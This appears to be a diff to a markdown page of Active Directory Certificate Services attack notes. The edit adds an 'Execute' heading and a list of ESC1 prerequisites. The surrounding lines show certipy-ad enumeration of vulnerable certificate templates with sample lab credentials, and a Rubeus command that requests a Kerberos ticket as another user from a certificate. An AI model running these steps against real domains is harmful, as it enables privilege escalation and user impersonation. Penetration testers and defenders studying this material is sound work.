@@ -2,6 +2,8 @@
 
 ## ESC1
 
+### Execute
+
 ```bash
 # enumerate existing templates
 certipy-ad find -scheme ldap -u TestAlpha@contoso.org -p 'win10-gui-P@$swd' -dc-ip 192.168.68.64 -stdout -vulnerable -enabled
@@ -106,6 +108,14 @@ Rubeus.exe asktgt /user:TargetUser /certificate:C:\Temp\cert.pfx
 
 # remember: one session can only contain one TGT - you can use "runas /netonly"
 ```
+
+### Prerequisites
+
+1. EKU: Client Authentication
+2. Template has to be enabled
+3. Requires Manager Approval: FALSE
+4. Enrollee Supplies Subject: True
+5. You have to have `Enrollment Rights` to enroll to that template.
 
 ## ESC4
 
